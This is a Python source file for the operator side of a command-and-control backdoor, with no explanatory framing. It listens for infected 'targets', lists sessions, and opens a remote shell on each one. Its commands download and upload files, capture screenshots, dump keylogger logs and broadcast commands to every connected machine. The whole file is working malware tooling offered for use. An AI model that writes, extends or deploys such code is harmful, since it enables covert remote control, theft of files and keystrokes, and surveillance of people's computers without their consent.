#!/usr/bin/python3
import socket
import json
import os
import base64
import threading
from termcolor import colored

value = 0

def sendtoall(target, data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def shell(target, ip):
    def increment():
        global value
        value += 1

    def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data.encode('utf-8'))

    def reliable_recv():
        data = " "
        while True:
            try:
                data = data + (target.recv(1024)).decode('utf-8')
                return json.loads(data)
            except ValueError:
                continue


    while True:
        command = input(colored("[*] Shell#~%s: " % str(ip), 'red'))
        reliable_send(command)
        if command == 'q':
            break
        elif command == 'exit':
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command[:3] == 'get':
            result = reliable_recv()
            print(result)
        elif command[:8] == 'download':
            with open(command[9:], 'wb') as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == 'upload':
            try:
                with open(command[7:], 'r') as file:
                    data = file.read()
                    reliable_send(data)
                    print('Uploaded Successfully')
            except:
                print("Failed to read")
        elif command[:10] == 'screenshot':
            increment()
            with open('screenshot%d' % value, 'wb') as screen:
                image = reliable_recv()
                image_decoded = (base64.b64decode(image))
                if image_decoded[:4] == '[!!]':
                    print(image_decoded)
                else:
                    screen.write(image_decoded)
        elif command[:12] == 'keylog_start':
            continue
        elif command[:11] == 'keylog_dump':
            result = reliable_recv()
            print(result)
        else:
            result = reliable_recv()
            print(result)



def server():
    global clients
    while True:
        if stop_threads:
            break
        s.settimeout(1)
        try:
            target, ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[clients]) + " * * * * " + str(ips[clients]) + "Has Connected!")
            clients += 1
        except:
            pass

global s
ips = []
targets = []

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("192.168.154.127", 54321))
s.listen(5)

print('[+] Waiting for targets to connect ... ')
clients = 0

stop_threads = False

t1 = threading.Thread(target=server)
t1.start()





while True:
    command = input('[+] Center: ')
    if command == 'targets':
        count = 0
        for ip in ips:
            print("Sessions: " + str(count) + ' <-----> ' + str(ip))
            count += 1
    elif command[:7] == 'session':
        try:
            num = int(command[8:])
            print(num)
            tarnum = targets[num]
            print('successfully assigned tarnum')
            tarip = ips[num]
            print('successfully assigned tarip')
            shell(tarnum, tarip)
            print('successfully called the shell')
        except:
            print('[!!] No Session under that number !! ')
    elif command == 'exit':
        for target in targets:
            target.close()
        s.close()
        stop_threads = True
        t1.join()
        break
    elif command[:7] == 'sendall':
        length_of_targets = len(targets)
        i = 0
        try:
            while i <= length_of_targets:
                tarnumber = targets[i]
                print(tarnumber)
                sendtoall(tarnumber, command)
                i += 1
        except:
            print("[!!] Failed to send commnand to all targets")
